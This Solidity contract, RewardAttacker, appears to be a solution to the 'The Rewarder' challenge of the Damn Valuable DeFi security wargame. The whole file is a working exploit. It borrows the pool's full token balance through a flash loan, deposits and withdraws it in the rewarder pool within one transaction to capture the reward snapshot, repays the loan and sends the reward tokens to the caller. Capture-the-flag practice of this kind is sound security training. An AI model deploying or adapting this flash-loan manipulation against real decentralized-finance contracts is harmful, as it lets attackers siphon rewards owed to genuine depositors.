// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "hardhat/console.sol";
contract RewardAttacker {
    FlashLoanerPool pool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityTokenPool;
    RewardToken rewardToken;

    constructor(address payable poolAddress, address payable rewarderPoolAddress, address payable liquidityTokenAddress, address payable rewardTokenAddress) {
        pool = FlashLoanerPool(poolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        liquidityTokenPool = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function attack() public {
        uint256 amount = liquidityTokenPool.balanceOf(address(pool));
        liquidityTokenPool.approve(address(rewarderPool), amount);
        pool.flashLoan(amount);
        // transfer reward token to attacker EOA 
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    // function receiveFlashLoan(uint256 amount) public {
    //     rewarderPool.deposit(amount);
    //     rewarderPool.withdraw(amount);
    //     // Pay back to the flash loan lender 
    //     liquidityTokenPool.transfer(address(pool), amount);
    // }
    
    /* Alternative to receiveFlashLoan() */
    fallback() external payable {
        uint256 amount = liquidityTokenPool.balanceOf(address(this));
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        // Pay back to the flash loan lender 
        liquidityTokenPool.transfer(address(pool), amount);
    }
}
